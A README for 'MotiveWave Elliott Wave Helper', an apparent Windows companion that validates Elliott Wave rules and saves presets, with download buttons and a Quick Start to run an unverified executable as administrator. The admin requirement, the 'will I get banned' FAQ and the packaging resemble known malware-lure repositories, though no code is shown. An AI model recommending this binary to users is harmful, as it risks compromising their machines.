# MotiveWave Elliott Wave Helper

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop companion for MotiveWave Elliott Wave analysis — validates wave counts, flags rule violations, and saves manual analysis presets.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/battalionsmithcastle/motivewave-elliott-helper-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Elliott Wave validation companion for MotiveWave |
| **Who it's for** | MotiveWave users who do manual Elliott Wave analysis |
| **What it solves** | Auto Analyze misses patterns, manual rules are tedious to check |
| **How it works** | Input wave points, validate rules, save presets |

---

## 🔥 Why This Exists

MotiveWave is the most advanced Elliott Wave platform on the market — manual components, Auto Analyze, Auto Wave, and a scanner. But the Auto Analyze engine has documented weaknesses. On the MotiveWave forum, users report that it mislabels corrective structures as motive waves, misses WXY/WXYXZ corrections, and produces counts that need manual correction.

Serious Elliott Wave traders do it manually. But manual analysis means checking rules by hand: wave 2 retracement limits, wave 3 extension, wave 4 overlap, Fibonacci ratios.

This helper automates the rule-checking. You input your wave points, it tells you if the count violates Elliott Wave rules. No more second-guessing.

---

## 🧩 What It Does

### Wave Rule Validator
- Input wave points (0, 1, 2, 3, 4, 5)
- Checks: wave 2 never retraces beyond wave 1 start
- Checks: wave 3 is never the shortest of waves 1, 3, 5
- Checks: wave 4 doesn't overlap wave 1 price territory
- Checks: Fibonacci ratios (wave 2 retracement, wave 3 extension) within tolerance

### Correction Pattern Checker
- For ABC corrections: validates internal structure
- For triangles: checks contracting/expanding rules
- Flags inconsistent wave labeling

### Preset Manager
- Save manual wave counts as named presets
- Reuse across instruments
- Export/import as JSON

### Export Report
- Export validation results as JSON or text
- Attach to your trading journal

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB | 100 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Terminal** | MotiveWave (Elliott Wave Lite or Ultimate) | Ultimate for scanner |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `MWElliottHelper.exe` as administrator
4. **Input** your wave points (0, 1, 2, 3, 4, 5)
5. **Click** Validate — see rule violations and Fibonacci consistency

---

## ❓ FAQ

**Does this replace MotiveWave's Auto Analyze?**
No — it validates what you or the engine produce. Use it as a second opinion, not a replacement.

**Do I need MotiveWave installed?**
Yes — this is a companion, not a standalone charting platform. It validates wave counts you create in MotiveWave.

**Does this interact with MotiveWave files?**
No — you manually input wave points. The helper doesn't read or modify MotiveWave files.

**Will I get banned?**
No — this is a standalone validation tool. It doesn't interact with MotiveWave's servers or any broker.

**Is this for beginners?**
It helps beginners learn the rules, but the primary audience is traders who already do manual Elliott Wave analysis and want to reduce errors.

**How do I uninstall?**
Delete the helper folder. No registry entries or system changes are made.

---

## 🗺️ Roadmap

- [ ] WXY/WXYXZ correction support
- [ ] Ratio analysis charts
- [ ] Multi-timeframe validation
- [ ] Export to MotiveWave analysis pack format

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

**Note:** This helper is not affiliated with MotiveWave. MotiveWave is a trademark of its respective owner.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/battalionsmithcastle/motivewave-elliott-helper-2026/releases/tag/1.0.0)

**Version 1.0.0** — Elliott Helper · Rule Validator · MIT

</div>
